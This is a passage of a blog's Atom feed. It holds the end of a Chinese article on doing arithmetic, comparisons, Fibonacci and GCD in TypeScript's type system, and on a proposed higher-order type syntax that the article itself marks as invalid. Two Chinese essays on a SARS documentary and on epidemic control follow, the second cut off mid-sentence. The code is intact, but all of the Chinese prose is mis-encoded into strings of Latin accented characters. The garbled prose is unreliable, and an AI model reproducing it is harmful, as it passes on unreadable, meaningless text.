type _not_false = Not&lt;'false'&gt;; // 'true'</code></pre><p>æœ€åæ˜¯æ¯”è¾ƒè¿ç®—ç¬¦ï¼Œæˆ‘ä»¬å…ˆä»å°äºå·å¼€å§‹ï¼Œé¦–å…ˆåˆ¤æ–­ <code>A</code> æ˜¯å¦æ˜¯ <code>0</code>ï¼Œç„¶å <code>B</code> æ˜¯å¦æ˜¯ <code>0</code>ï¼Œæœ€åæ˜¯ä¸€ä¸ªé€’å½’ã€‚è¿™æ˜¯ä¸€ä¸ªä¸‰å‰è·¯å£ï¼Œä½†å¯¹äº TypeScript æ¥è¯´ä¸åœ¨è¯ä¸‹ï¼š</p><pre><code class="lang-typescript">type Lt&lt;A extends Int, B extends Int&gt; = {
    'A = 0': Not&lt;Eq&lt;B, _0&gt;&gt;
    'B = 0': 'false'
    'other': Lt&lt;Prev&lt;A&gt;, Prev&lt;B&gt;&gt;
}[
    A extends _0
        ? 'A = 0'
        : B extends _0
            ? 'B = 0'
            : 'other'
];

type _lt_1_2 = Lt&lt;_1, _2&gt;; // 'true'
type _lt_5_3 = Lt&lt;_5, _3&gt;; // 'false'
type _lt_4_4 = Lt&lt;_4, _4&gt;; // 'false'</code></pre><p>å…¶å®ƒçš„ç¬¦å·ï¼Œå…¶å®å¯ä»¥é€šè¿‡ <code>Lt</code>ã€<code>Eq</code> é…åˆ <code>And</code>ã€<code>Or</code>ã€<code>Not</code> æ¥å®ç°ï¼š</p><pre><code class="lang-typescript">type Lte&lt;A extends Int, B extends Int&gt; =
    // ä½¿ç”¨ `extends` å’Œ `infer` æ¥æå‰è®¡ç®— a&lt;b
    Lt&lt;A, B&gt; extends infer R
        ? Or&lt;Cast&lt;R, Bool&gt;, Eq&lt;A, B&gt;&gt;
        : never;
type Gt&lt;A extends Int, B extends Int&gt; = Not&lt;Lte&lt;A, B&gt;&gt;;
type Gte&lt;A extends Int, B extends Int&gt; = Or&lt;Gt&lt;A, B&gt;, Eq&lt;A, B&gt;&gt;;</code></pre><h1>ä¸€ä¸ªæ¯”è¾ƒå®Œç¾çš„å®ç°</h1><p>æœ‰äº†ä¹‹å‰çš„ç§¯ç´¯ï¼Œä¸Šé¢çš„å‡ ä¸ªå‡½æ•°å°±æ¯”è¾ƒå¥½å†™äº†ï¼š</p><pre><code class="lang-typescript">type Fibonacci&lt;N extends Int&gt; = {
    'true': _1
    // ä½¿ç”¨ `extends` å’Œ `infer` æ¥æå‰è®¡ç®— f[n-1] å’Œ f[n-2]
    'false': Fibonacci&lt;Sub&lt;N, _1&gt;&gt; extends infer F_N_1
        ? Fibonacci&lt;Sub&lt;N, _2&gt;&gt; extends infer F_N_2
            ? Add&lt;Cast&lt;F_N_1, Int&gt;, Cast&lt;F_N_2, Int&gt;&gt;
            : never
        : never
}[Lte&lt;N, _2&gt;];

type _fibonacci_1 = Fibonacci&lt;_1&gt;; // [any]
type _fibonacci_2 = Fibonacci&lt;_2&gt;; // [any]
type _fibonacci_3 = Fibonacci&lt;_3&gt;; // [any, any]
type _fibonacci_4 = Fibonacci&lt;_4&gt;; // [any, any, any]
type _fibonacci_5 = Fibonacci&lt;_5&gt;; // [any, any, any, any, any]
type _fibonacci_6 = Fibonacci&lt;_6&gt;; // [any, any, any, any, any, any, any, any]

type Gcd&lt;X extends Int, Y extends Int&gt; = {
    'true': X
    'false': Gcd&lt;Y, Mod&lt;X, Y&gt;&gt;
}[Eq&lt;Y, _0&gt;]

type H&lt;N extends Int, A extends Int, B extends Int&gt; = {
    'N = 0': Next&lt;B&gt;
    'N = 1 &amp; B = 0': A
    'N = 2 &amp; B = 0': _0
    'N &gt; 2 &amp; B = 0': _1
    // ä½¿ç”¨ `extends` å’Œ `infer` æ¥æå‰è®¡ç®— h(n, a, b-1)
    'other': H&lt;N, A, Prev&lt;B&gt;&gt; extends infer R ? H&lt;Prev&lt;N&gt;, A, Cast&lt;R, Int&gt;&gt; : never
}[
    Eq&lt;N, _0&gt; extends 'true'
        ? 'N = 0'
        : And&lt;Eq&lt;N, _1&gt;, Eq&lt;B, _0&gt;&gt; extends 'true'
            ? 'N = 1 &amp; B = 0'
            : And&lt;Eq&lt;N, _2&gt;, Eq&lt;B, _0&gt;&gt; extends 'true'
                ? 'N = 2 &amp; B = 0'
                : And&lt;Gt&lt;N, _2&gt;, Eq&lt;B, _0&gt;&gt; extends 'true'
                    ? 'N &gt; 2 &amp; B = 0'
                    : 'other'
]

type _h_0_0_3 = H&lt;_0, _0, _3&gt;; // 3+1=4,  [any, any, any, any]
type _h_1_5_6 = H&lt;_1, _5, _6&gt;; // 5+6=11, [any, any, any, any, any, any, any, any, any, any, any]
type _h_2_4_2 = H&lt;_2, _4, _2&gt;; // 4*2=8,  [any, any, any, any, any, any, any, any]
type _h_3_3_3 = H&lt;_3, _3, _3&gt;; // 3^3=27, [any, any, any, any, any, any, any, any, any, any, any, any, any, any, any, any, any, any, any, any, any, any, any, any, any, any, any]</code></pre><h1>æ— æ³•å®ç°çš„é—®é¢˜ï¼Œä»¥åŠæœªæ¥çš„è§£å†³æ–¹æ¡ˆ</h1><p>ä¸Šé¢çš„ä¾‹å­çœ‹èµ·æ¥å¾ˆå®Œç¾ã€å¾ˆç¬¦åˆé€»è¾‘ï¼Œä½†æ¯•ç«Ÿ TypeScript ç±»å‹ç³»ç»Ÿå¹¶ä¸æ˜¯ä¸ºäº†å‡½æ•°å¼ç¼–ç¨‹è€ŒæœåŠ¡çš„ï¼Œå› æ­¤ä¹Ÿæœ‰ä¸€äº›æ€æƒ³æ˜¯å®ƒæš‚æ—¶æ— æ³•å®ç°çš„ã€‚</p><blockquote><p>æ³¨æ„ï¼šåªæ˜¯æ€æƒ³æ— æ³•å®ç°ã€‚TypeScript ç±»å‹ç³»ç»Ÿåœ¨ç†æƒ³çŠ¶æ€ä¸‹æ˜¯å›¾çµå®Œå¤‡çš„ã€‚</p></blockquote><h2>æƒ°æ€§è®¡ç®—</h2><p>è¿™å…¶å®æ˜¯ TypeScript ç›®å‰çš„å®šä½å’Œè®¾è®¡æ‰€å¯¼è‡´çš„ã€‚æœ¬æ–‡çš„â€œå‡½æ•°â€åªæ˜¯ TypeScript ä¸­æ™®é€šçš„â€œå·¥å…·ç±»å‹â€ï¼Œå¹¶æ²¡æœ‰çœŸæ­£çš„â€œå‡½æ•°â€çš„åŠŸèƒ½ï¼Œæ‰€è°“çš„â€œè¿”å›å€¼â€ä¹Ÿåªæ˜¯è·Ÿè¿™ä¸ªå®šä¹‰çš„å†…å®¹ç­‰ä»·çš„â€œTypeScript ç±»å‹â€è€Œå·²ã€‚è™½ç„¶æ¯ä¸ªå·¥å…·ç±»å‹æœ¬èº«å†™èµ·æ¥æ˜¯å‡½æ•°å¼ç¼–ç¨‹ï¼Œä½†ä¸åŒçš„å·¥å…·ç±»å‹å´æ˜¯æŒ‰ç…§å‘½ä»¤å¼é€ä¸€å®šä¹‰å¹¶æ¨å¯¼çš„ã€‚</p><h2>å‡½æ•°æ˜¯ä¸€ç­‰å…¬æ°‘</h2><p>è€ƒè™‘åˆ°è¿™æ ·ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒçš„è¾“å…¥å’Œè¾“å‡ºéƒ½æ˜¯å‡½æ•°ï¼š</p><pre><code class="lang-javascript">function compose(...f) {
    return f.length === 0
        ? undefined
        : f.length === 1
          ? f[0]
          : (...args) =&gt; f[0](compose(...f.slice(1))(args));
}</code></pre><p>å¦‚æœç”¨ TypeScript ç±»å‹ç³»ç»Ÿæ¥å†™ï¼Œä¼šæ˜¯ä»€ä¹ˆæ ·çš„å‘¢ï¼Ÿ</p><blockquote><p>æ³¨æ„ï¼šä»è¿™é‡Œå¼€å§‹ï¼Œæ‰€æœ‰çš„ TypeScript ä»£ç åœ¨æœ¬æ–‡å‘å¸ƒçš„æ—¶æœŸéƒ½æ˜¯é”™è¯¯çš„ï¼Œä¸è¦æ¨¡ä»¿ã€‚</p></blockquote><pre><code class="lang-typescript">type Compose&lt;F&gt; =
    F['length'] extends 0
        ? undefined
        : F['length'] extends 1
            ? F[0]
            : ########</code></pre><p>äº•å·çš„éƒ¨åˆ†å†™èµ·æ¥å¹¶æ²¡æœ‰é‚£ä¹ˆç›´è§‚ã€‚äº‹å®ä¸Šï¼ŒTypeScript ç›®å‰ä¸æ”¯æŒé«˜é˜¶å·¥å…·ç±»å‹ï¼ˆHigher order typesï¼‰ï¼Œå› æ­¤æˆ‘ä»¬æ²¡æœ‰åŠæ³•æŠŠâ€œå‡½æ•°â€ä½œä¸ºè¾“å…¥å’Œè¾“å‡ºã€‚</p><h2>æœªæ¥çš„è§£å†³æ–¹æ¡ˆ</h2><p>ç›®å‰ TypeScript æœ‰è¿™æ ·ä¸€ä¸ª Proposalï¼š<a href="https://github.com/microsoft/TypeScript/issues/1213#issuecomment-523245130">Higher Order, Lamda, Reference types</a>ï¼Œç›®å‰çš„çŠ¶æ€æ˜¯ Backlogï¼ˆå¾…åŠï¼‰ã€‚å®ƒçš„è¯­æ³•æœ‰ç‚¹ç±»ä¼¼äº C é‡Œé¢çš„å‡½æ•°æŒ‡é’ˆï¼š</p><pre><code class="lang-typescript">type A&lt;T extends string&gt; = { 0: T }
type B&lt;T extends string&gt; = [T]
type C&lt;T extends number&gt; = 42

// Here's our lamda
type Referer&lt;*Ref&lt;X extends string&gt;, T extends string&gt; = Ref&lt;T&gt;

type testA = Referer&lt;A, 'hi'&gt; // { 0: 'hi' }
type testB = Referer&lt;B, 'hi'&gt; // ['hi']
type testC = Referer&lt;C, 'hi'&gt; // ERROR</code></pre><p>å”¯ä¸€éœ€è¦åšçš„å°±æ˜¯åœ¨â€œå‚æ•°â€å‰é¢åŠ ä¸€ä¸ªæ˜Ÿå·ï¼Œè¡¨ç¤ºè¿™ä¸ªâ€œå‚æ•°â€æ˜¯ä¸€ä¸ªæ³›å‹ï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½å°†â€œå‡½æ•°â€ä½œä¸ºâ€œå‚æ•°â€ä¼ è¿›å»äº†ã€‚å¦‚æœç”¨æ™®é€šçš„ä»£ç æ¥å†™ï¼Œå¤§æ¦‚æ˜¯è¿™æ ·ï¼š</p><pre><code class="lang-typescript">const a = (t: string) =&gt; ({ 0: t });
const b = (t: string) =&gt; [t];
const c = (t: number) =&gt; 42;

// Here's our lamda
const referer = (ref: (x: string) =&gt; any, t: string) =&gt; ref(t)

const testA = referer(a, 'hi') // { 0: 'hi' }
const testB = referer(b, 'hi') // ['hi']
const testC = referer(c, 'hi') // type mismatch</code></pre><p>å…ˆä¸ç®¡å®ƒä»¥åä¼šä¸ä¼šè¢«å®ç°ï¼Œè‡³å°‘å¯ä»¥ç¡®å®šçš„æ˜¯ï¼šå¦‚æœæœ‰äº†è¿™ä¸ªåŠŸèƒ½ï¼Œä¸Šé¢ä¸¤ä¸ªé—®é¢˜å°±éƒ½èƒ½è§£å†³äº†ï¼šç¬¬äºŒä¸ªé—®é¢˜æ— éœ€å¤šè®²ï¼›å¯¹äºç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œç”±äºéœ€è¦æ”¯æŒä¼ å…¥ä¸€ä¸ªæ³›å‹ï¼Œé‚£ä¹ˆæ”¯æŒä¼ å…¥æ³›å‹çš„é‚£ä¸ªæ³›å‹ï¼ˆä¸Šæ–‡çš„ <code>Referer</code>ï¼‰åœ¨ä¼ å…¥ä¹‹å‰æ˜¯æ— æ³•è¢«æ¨å¯¼çš„ã€‚ä½œè€…ä¹Ÿè¯´äº†ï¼šIn this context, we can say that <code>*</code> "protects" against immediate evalutation.</p><h2>åšä¸ªè„‘åŠ›æ¸¸æˆå§</h2><p>å‡å¦‚çœŸçš„æœ‰äº†è¿™ä¸ªåŠŸèƒ½ï¼Œæˆ‘ä»¬è¯¥æ€ä¹ˆå®ç° <code>Compose</code> å‘¢ï¼Ÿ</p><pre><code class="lang-typescript">type Compose&lt;
    F extends Array&lt;*Ref&lt;T extends any&gt;&gt;
&gt; =
    F['length'] extends 0
        ? undefined
        : F['length'] extends 1
            ? F[0]
            : ########</code></pre><p>è¿™ä¸ªç‰¹æ€§ä¾æ—§æ— æ³•è®©æˆ‘ä»¬åœ¨äº•å·çš„åœ°æ–¹ç›´æ¥ç”¨ <code>type xxx = yyy</code> è¿™ç§æ–¹å¼æ¥å®šä¹‰â€œå‡½æ•°â€ã€‚</p><p>æ–¹æ³•æ€»æ¯”å›°éš¾å¤šï¼Œä¸æ˜¯ä¸èƒ½åœ¨å®šä¹‰ä¸­å®šä¹‰å—ï¼Œæˆ‘åœ¨ä¹‹å‰å…ˆå®šä¹‰å¥½ä¸å°±å¯ä»¥äº†ï¼Ÿæˆ‘æŠŠäº•å·éƒ¨åˆ†æŠ½æˆä¸€ä¸ªè¾…åŠ©å‡½æ•° <code>P</code>ï¼š</p><pre><code class="lang-typescript">type P&lt;F extends Array&lt;*Ref&lt;T extends any&gt;&gt;&gt; = *(F[0])&lt;Compose&lt;Tail&lt;F&gt;&gt;&gt;;</code></pre><p>é‚£ä¹ˆäº•å·çš„éƒ¨åˆ†å°±å¯ä»¥ç›´æ¥å†™ <code>*(P&lt;F&gt;)</code> äº†ï¼</p><p>ç„¶è€Œè¿™æœ‰ä¸ªé—®é¢˜ï¼š<code>P</code> è¦åœ¨ <code>Compose</code> ä¹‹å‰å®šä¹‰ï¼Œä½† <code>P</code> é‡Œé¢åˆç”¨åˆ°äº† <code>Compose</code>ã€‚åœ¨å‡½æ•°å¼ç¼–ç¨‹ä¸­æœ‰ä¸€ä¸ªæ–¹æ³•å¯ä»¥è§£å†³ï¼šæˆ‘ä»¬å¯ä»¥å°† <code>Compose</code> ä½œä¸ºå‚æ•°ä¼ å…¥ <code>P</code>ï¼Œå°±åƒè¿™æ ·ï¼š</p><pre><code class="lang-typescript">type P&lt;
  *H&lt;*F extends Array&lt;*Ref&lt;T extends any&gt;&gt;&gt;,
  F extends Array&lt;*Ref&lt;T extends any&gt;&gt;
&gt; = *(F[0])&lt;H&lt;Tail&lt;F&gt;&gt;&gt;;</code></pre><pre><code class="lang-typescript">type Compose&lt;
    F extends Array&lt;*Ref&lt;T extends any&gt;&gt;
&gt; =
    F['length'] extends 0
        ? undefined
        : F['length'] extends 1
            ? F[0]             // is a generic
            : *(P&lt;Compose, F&gt;) // is also a generic</code></pre><p>æ›´è¿›ä¸€æ­¥ï¼Œæˆ‘ä»¬å¯èƒ½å¯ä»¥æ¨å‡ºå‡½æ•°å¼ç¼–ç¨‹ä¸­çš„ Y-ç»„åˆå­ï¼Œä»è€Œä»å¦ä¸€ä¸ªæ–¹å‘ä¸Šè¯æ˜äº†å®ƒæ˜¯å›¾çµç­‰ä»·çš„ã€‚</p><h1>å‚è€ƒèµ„æ–™</h1><ul><li><a href="https://www.byvoid.com/zhs/blog/apio-fp">APIOè®²ç¨¿â€”â€”å‡½æ•°å¼ç¼–ç¨‹ - BYVoid</a></li></ul>]]></content>
        <author>
            <name><![CDATA[RÂ·ex / Zeng]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.suruifu.com/posts/389</id>
        <title><![CDATA[åªå…³äººæ€§ï¼ˆè§‚ã€Šéå…¸åå¹´ç¥­ã€‹æœ‰æ„Ÿï¼‰]]></title>
        <updated>2020-02-02T11:02:37+08:00</updated>
        <link href="https://www.suruifu.com/posts/389"/>
        <content type="text/html" src="https://www.suruifu.com/posts/389"><![CDATA[<p><strong><em>æœ¬æ–‡ä½œè€…å°æ‰</em></strong></p>
<blockquote><p>
  åœ¨ä»Šå¹´æ˜¥èŠ‚è¿™ä¸ªç‰¹æ®Šæ—¶æœŸï¼Œå‡¤å‡°å«è§†é‡æ–°æ¨å‡ºäº†7å¹´å‰çš„çºªå½•ç‰‡ã€‚
</p></blockquote>
<h3>ä¸€åˆ‡éƒ½è¦åŸºäºäººæ€§</h3>
<p>7å¹´å‰çš„äººä»¬è®¤ä¸ºä¿¡æ¯é€æ˜åº¦ä¸å¤Ÿæ˜¯å¯¼è‡´éå…¸åœ¨æ‰©æ•£ä¹‹åˆæ²¡å¾—åˆ°åˆç†çš„å…³æ³¨å’Œé‡è§†åŸå› ä¹‹ä¸€ã€‚åœ¨å°å°å±å¹•ä¸Šçš„ä¸€æ¡æ¡çŸ­ä¿¡ï¼Œç¡®å®è®©æˆ‘ä»¬æ„Ÿå—é¥è¿œæ—¶ä»£çš„é™ˆæ—§æ„Ÿã€‚å¦‚ä»Šï¼Œç½‘é€Ÿå˜å¿«ï¼Œä¿¡æ¯é€æ˜åº¦è‡ªç„¶æé«˜ï¼Œæ—©æœŸçš„æ¶ˆæ¯ä¾ç„¶è¢«å®ˆå¾—å¯†ä¸é€é£ï¼Œè¶Šè‡ªç”±åè€Œè¶Šä¸¥å¯†ã€‚ä¸ºä»€ä¹ˆï¼Ÿè¿™æ˜¯ä¸€ä¸ªç›¸å½“è‡ªç„¶çš„åæ˜ ï¼Œå°±åƒæ²¡äººæ„¿æ„æŠŠæ‰€æœ‰çš„å°ç¼ºç‚¹å‘Šè¯‰ä»–äººä¸€æ ·ã€‚ä½•æ—¶é€éœ²ï¼Œä½•ç§æ–¹æ³•é€éœ²ï¼Œå–å†³äºå¯¹äº‹æƒ…ä¸¥é‡ç¨‹åº¦çš„åˆ¤æ–­ã€‚</p>
<p>åœ¨æ²»ç–—è¿‡ç¨‹ä¸­ï¼Œå‡ºç°äº†å¾ˆå¤šå‘äººæ·±æ€çš„å°æ’æ›²ã€‚äººä»¬å¯¹äºè½¬é™¢å’Œå»ä¸“é—¨åŒ»é™¢è¿™ç±»äº‹æƒ…ï¼Œæœ‰ç€å¼ºçƒˆçš„æŠµè§¦æƒ…ç»ªã€‚å½“ä¸€ä¸ªäººè¢«é€åˆ°å°æ±¤å±±æ—¶æ‹’ç»ä¸‹è½¦ï¼Œå› ä¸ºå®³æ€•è¢«é€åˆ°é›†ä¸­è¥ï¼Œè¿™çœ‹èµ·æ¥æœ‰äº›å¯ç¬‘ã€‚ç„¶è€Œä¼ æŸ“ç—…æŠ‘åˆ¶æ–¹æ³•ä¸‰éƒ¨æ›²ä¹‹ä¸€æ˜¯æ¶ˆé™¤ä¼ æŸ“æºï¼Œè°åˆèƒ½çŸ¥é“è¿™ä¸ªæ¶ˆé™¤çš„çœŸæ­£å«ä¹‰æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿå½“ä¸ªäººåˆ©ç›Šå’Œç¤¾ä¼šåˆ©ç›Šä¸å®Œå…¨ä¸€è‡´æ—¶ï¼Œè°åˆä¸ä¼šäº§ç”Ÿè¿™ç§ææƒ§ï¼Ÿ</p>
<h3>è½»è½»åœ°æ¥æ­£å¦‚è½»è½»åœ°å»</h3>
<p>SARSçš„å‡ºç°å’Œæ¶ˆå¤±å°±æ˜¯è¿™ä¹ˆçªç„¶ï¼Œæ¶ˆå¤±åå¤šå¹´å…¶æºå¤´ä»æ— ä»çŸ¥æ™“ï¼Œäº¦æ— ç‰¹æ•ˆè¯ã€‚å¥½åƒå­˜åœ¨æœ¬èº«å°±æ˜¯ç”¨æ¥æé†’å’Œå˜²è®½äººç±»çš„æ¸ºå°ä¸€èˆ¬ï¼Œç„¶è€Œå¯¹æˆ‘ä»¬çš„æé†’ï¼Œæ˜¯å¦çœŸçš„è¢«å¬åˆ°å‘¢ï¼Ÿçºªå½•ç‰‡çš„æ–°é—»ä¸Šèµ«ç„¶å†™ç€H1N1æµæ„Ÿåœ¨ä¸Šæµ·ä¼ æ’­ï¼Œåˆ°äº†ä»Šæ—¥äººä»¬æ‰ä¸æ–­å®£ä¼ å‹¤æ´—æ‰‹ï¼Œæˆ´å£ç½©ã€‚è®©äººä¸ç¦å‘é—®ï¼Œè™½ç„¶æŠ€æœ¯åœ¨è¿›æ­¥ï¼Œç‰©è´¨åœ¨ä¸°å¯Œï¼Œå¯æ˜¯äººç±»çœŸçš„è¿›æ­¥äº†å—ï¼Ÿ</p>
<h3>åæ¥çš„åæ¥</h3>
<p>å› ç—…æ­»å»å’Œä¸€ç›´æ´»åœ¨é˜´å½±ä¸­ï¼Œåˆ°åº•è¯¥å¦‚ä½•å–èˆï¼Ÿè™½è¯´SARSæ²¡æœ‰ç‰¹æ•ˆè¯ï¼ŒåŒ»ç”Ÿåªèƒ½å…µæ¥å°†æŒ¡æ°´æ¥åœŸæ©ï¼Œæ¿€ç´ çš„é‡çœŸçš„æ˜¯éš¾ä»¥æ§åˆ¶ï¼Ÿæ— æš‡é¡¾åŠï¼Ÿè¿˜æ˜¯ä¸ºäº†å‡ºé™¢ç‡å’Œæ²»æ„ˆç‡ä¸æƒœä¸€åˆ‡ä»£ä»·å‘¢ï¼Ÿå…¶ä¸­å¹´è½»å°æŠ¤å£«çš„æ•…äº‹è®©äººå¿ƒç–¼ï¼Œå¯¹äºä¸€ä¸ªå°å§‘å¨˜æ¥è¯´ï¼Œå¥åº·å’Œé’±å“ªä¸ªä»·å€¼æ›´å¤§å‘¢ï¼Ÿçœ‹ç€å½“å¹´äººä»¬å¯¹æœªæ¥çš„é¢„æµ‹ï¼Œâ€œä»¥åä¸ä¼šå‘ç”Ÿè¿™æ ·çš„äº‹äº†â€ï¼Œæ˜¯é¼“èˆä¿¡å¿ƒçš„ç¾å¥½æ„¿æœ›è¿˜æ˜¯å‡¸æ˜¾äº†é¢„æµ‹çš„æ¯«æ— ä»·å€¼å‘¢ï¼Ÿ</p>
<h3>ç»æµå­¦è§†è§’</h3>
<p>è¿™å‡ å¤©ä¸€ç›´åœ¨é˜…è¯»è–›å…†ä¸°ç»æµå­¦è®²ä¹‰ï¼Œæˆ‘ä»¬ä¹‹æ‰€ä»¥æ²¡æœ‰å› éå…¸è€Œåšå‡ºæ”¹å˜ï¼Œæ˜¯å› ä¸ºæˆæœ¬å¤ªé«˜ï¼Œä»·å€¼å¤ªä½ã€‚ä¿®å»ºå…¨å›½ä¼ æŸ“ç—…é¢„é˜²ç³»ç»Ÿæˆ–è€…æ˜¯æ¨è¡Œä¸€å¥—å…¨å›½å¿…é¡»æ‰§è¡Œçš„å¥åº·å®‰å…¨æ ‡å‡†ä¼¼ä¹éƒ½æœ‰äº›ä¸åˆé€‚ã€‚æ­¤å¤–ï¼Œä¸ä¸Šæ¬¡ä¸åŒï¼Œè¿™æ¬¡ä¿¡æ¯é€æ˜åº¦å¢åŠ å’Œæ°‘ä¼—çš„å…³æ³¨åº¦æé«˜ï¼Œäººæƒã€éšç§é—®é¢˜ã€äººèº«è‡ªç”±å°±è¢«å…¨é¢çš„ä¾µçŠ¯äº†ï¼Œä¸è¿‡ä¸€åˆ‡ä»¥ç¤¾ä¼šæ•ˆç›Šæœ€å¤§åŒ–çš„å‰æä¸‹ï¼Œè¿™å¹¶æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ã€‚åœ¨é¢å¯¹æœªçŸ¥é—®é¢˜æ—¶ï¼Œä»¥æœ€èŠ‚çº¦æˆæœ¬ï¼Œæœ€æœ‰æ•ˆç‡çš„æ–¹æ³•è§£å†³ï¼Œè®©é¿å…æ„å¤–æˆæœ¬æœ€ä½çš„ä¸€æ–¹æ¥æ‰¿æ‹…è´£ä»»ï¼Œçš„ç¡®æ˜¯è¾ƒå¥½çš„åŠæ³•ã€‚ä½†æ˜¯ï¼Œå¦‚æœä¸ä»¥ç¤¾ä¼šæ•ˆç›Šæœ€å¤§åŒ–ä¸ºç›®æ ‡åˆä¼šæ˜¯æ€æ ·çš„å‘¢ï¼Ÿè¿™ä¸€ç‚¹æˆ‘è¿˜æ²¡æƒ³æ¸…æ¥šã€‚</p>
<h3>ç»“è¯­</h3>
<p>å›æœ›å†å²æˆ–è€…é˜…è¯»ç»å…¸ï¼Œä¸æ˜¯ä¸ºäº†åŠ›æŒ½ç‹‚æ¾œæˆ–æ˜¯é¿å…ç¾ç¥¸ï¼Œè€Œæ˜¯é‡åˆ°æ—¶ç¾ç¥¸æ—¶ï¼Œæ— è®ºç»“æœéƒ½èƒ½æ›´å¦ç„¶ã€‚</p>]]></content>
        <author>
            <name><![CDATA[è‹ç‘è¾…çš„ä¸ªäººç½‘ç«™]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.suruifu.com/posts/385</id>
        <title><![CDATA[æ§åˆ¶ä¼ æŸ“ç—…ï¼ˆè§‚ã€Šéå…¸åå¹´ç¥­ã€‹æœ‰æ„Ÿï¼‰]]></title>
        <updated>2020-02-01T07:15:17+08:00</updated>
        <link href="https://www.suruifu.com/posts/385"/>
        <content type="text/html" src="https://www.suruifu.com/posts/385"><![CDATA[<blockquote><p>
  å¦‚ä»Šå…¨å›½ä¸Šä¸‹éƒ½èƒ½ä¸2019-ncovå¯¹æŠ—ï¼Œæˆ‘è§‚çœ‹äº†ã€Šéå…¸åå¹´ç¥­ã€‹è®°å½•ç‰‡ï¼Œåœ¨æ­¤è®°å½•ä¸€ä¸‹è‡ªå·±çš„æ„Ÿå—ã€‚
</p></blockquote>
<p><img src="https://s.suruifu.com/www/2020/02/2019-ncovå®å†µ.png" alt="" /></p>
<p>â€œä¼ æŸ“ç—…â€ç”±â€œä¼ æŸ“â€å’Œâ€œç—…â€ä¸¤éƒ¨åˆ†ç»„æˆï¼Œæˆ‘è®¤ä¸ºæ§åˆ¶ä¼ æŸ“ç—…ä¹Ÿåº”è¯¥ä»ä¸¤ä¸ªè§’åº¦æ¥è€ƒè™‘ã€‚</p>
<h3>æ§åˆ¶â€œä¼ æŸ“â€</h3>
<p>æˆ‘ä»¬å¯ä»¥ä»ä¸€ä¸ªå®é™…çš„é—®é¢˜å¼€å§‹ï¼Œå¦‚æœä½ æœ‰ä¸€ä¸ªæ‰“å‘¼å™œçš„å®¤å‹ï¼Œä½ è¯¥æ€ä¹ˆåŠï¼Ÿæƒ³åˆ°çš„æ–¹æ³•æ— éæœ‰ä¸‰ç§ã€‚<br />
1. é˜²æ­¢å‘¼å™œå£°äº§ç”Ÿã€‚å°†å®¤å‹éš”ç¦»ã€ä¸ºå®¤å‹æ²»ç–—ç–¾ç—…ã€é˜»æ­¢å®¤å‹å¤œæ™šç¡è§‰ï¼›<br />
2. é˜»ç¢å‘¼å™œå£°ä¼ æ’­ã€‚å°†å®¿èˆæŠ½æˆçœŸç©ºä½¿å¾—å£°éŸ³æ²¡æœ‰ä¼ æ’­åª’ä»‹ã€åœ¨å®¤å†…å»ºé€ å¢™ä½“é˜»ç¢å£°éŸ³ä¼ æ’­ç­‰ï¼›<br />
3. é˜²æ­¢å™ªå£°è¿›å…¥äººè€³ã€‚æˆ´ä¸Šè€³å¡ç­‰ã€‚</p>
<p>å½“æˆ‘ä»¬æ¥åˆ°äº†ä¼ æŸ“ç—…ä¼ æ’­çš„é—®é¢˜ä¸Šï¼Œä¹Ÿæ˜¯ç›¸åŒçš„é“ç†ï¼Œå¯¹åº”ç€ä¹Ÿæœ‰ä¸‰ç§æ–¹æ³•ã€‚<br />
1. éš”ç¦»ä¼ æŸ“æºã€‚åŠ å¼ºç›‘æµ‹ã€å°†ç¡®è¯Šæˆ–ç–‘ä¼¼ç—…äººè¿›è¡Œéš”ç¦»æ²»ç–—ï¼›<br />
2. é˜²æ­¢ç–¾ç—…ä¼ æ’­ã€‚å–æ¶ˆå…¬å…±æ´»åŠ¨ã€å¯¹å…¬å…±è®¾æ–½è¿›è¡Œå®šæœŸæ¶ˆæ¯’ç­‰ï¼›<br />
3. é˜²æ­¢ç–¾ç—…è¿›å…¥äººä½“ã€‚å‡ºé—¨æˆ´å£ç½©ã€å‹¤æ´—æ‰‹ç­‰ã€‚</p>
<h3>æ§åˆ¶â€œç—…â€</h3>
<p>å¯¹äºä¼ æŸ“ç—…ï¼Œåº·å¤æœ‰ä¸¤ä¸ªé€”å¾„ã€‚<br />
1. ä¾èµ–äºè‡ªèº«å…ç–«ç³»ç»Ÿï¼›<br />
2. å­˜åœ¨ç‰¹æ•ˆè¯ç‰©ã€‚<br />
å½“æ²¡æœ‰ç‰¹æ•ˆè¯çš„æ—¶å€™ï¼Œå°±ä»…ä»…ä¾èµ–äºè‡ªèº«å…ç–«ç³»ç»Ÿäº†ã€‚å…¶å®æˆ‘ä»¬è‡ªèº«å…ç–«ç³»ç»Ÿè¿˜æ˜¯éå¸¸å¼ºå¤§çš„ï¼Œå°±æ˜¯å¹²èµ·æ´»æ¥ä¸è®¤äººï¼Œæ­£å¦‚é‚£å¥ç¬‘è¯æ‰€è®²çš„ï¼Œâ€œæˆ‘æ‰¿è®¤æˆ‘æœ‰èµŒçš„æˆåˆ†ï¼Œä½†æ˜¯ä»Šå¤©ä½ å’Œç—…æ¯’å¿…é¡»æ­»ä¸€ä¸ªâ€ã€‚åœ¨å…ç–«ç³»ç»Ÿå‘åŠŸçš„æ—¶å€™ï¼Œäººä½“è‡ªèº«ä¼šæœ‰å¾ˆå¤šå¹¶å‘ç—‡ï¼Œæ¯”å¦‚è¯´å‘çƒ§ç­‰ã€‚è¿™ä¸ªæ—¶å€™ä¸ºäº†é¿å…å¹¶å…ç–«ç³»ç»Ÿå¹²æ­»ï¼Œå°±éœ€è¦åŒ»ç–—æ‰‹æ®µçš„å¹²é¢„ã€‚æ¢å¥è¯è¯´ï¼Œ<strong>åœ¨æ²¡æœ‰ç‰¹æ•ˆè¯çš„æƒ…å†µä¸‹ï¼Œç°ä»£åŒ»å­¦æ˜¯éå¸¸è¢«åŠ¨çš„</strong>ã€‚å¦‚æœä½ 